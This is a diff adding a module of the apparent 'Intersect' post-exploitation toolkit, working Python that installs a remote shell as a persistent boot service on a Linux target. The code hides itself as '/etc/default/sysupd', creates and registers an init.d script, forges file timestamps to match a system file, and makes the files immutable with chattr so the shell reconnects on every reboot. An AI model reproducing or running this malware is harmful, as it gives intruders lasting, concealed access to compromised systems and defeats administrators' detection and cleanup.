@@ -1,0 +1,31 @@
+
+'''
+@description: installs the currently running Intersect shell as a persistent service on the target system
+@author: ohdae [bindshell@live.com]
+'''
+current = os.path.abspath(__file__)
+if os.path.exists(current) is True:
+    shutil.copy2(current, "/etc/default/sysupd")
+
+if os.path.isdir("/etc/init.d"):
+    p = open("/etc/init.d/sysupd", "w")
+    p.write("#!/bin/sh\ncd /etc/default/\npython sysupd")
+    p.close()
+    os.system("chmod +x /etc/init.d/sysupd")
+    os.system("update-rc.d sysupd defaults")
+    status_msg("Modifying time-stamps on edited files...")
+    copystat = os.stat("/etc/init.d/rcS")
+    os.utime("/etc/default/sysupd",(copystat.st_atime, copystat.st_mtime))
+    os.utime("/etc/init.d/sysupd",(copystat.st_atime, copystat.st_mtime))
+    print("Attempting to lock files...")
+    if whereis("chattr") is not None:
+        status = os.system("chattr +i /etc/default/sysupd")
+        if status & 0xff00:
+            status_msg("Chattr exited with non-zero status. Could not lock files.")
+        status = os.system("chattr +i /etc/init.d/sysupd")
+        if status & 0xff00:
+            status_msg("Chattr exited with non-zero status. Could not lock files.")
+    else:
+        status_msg("Chattr not found. Could not lock files.")
+
+    status_msg("Persistent service installed. Intersect will now open a connection on every reboot.")
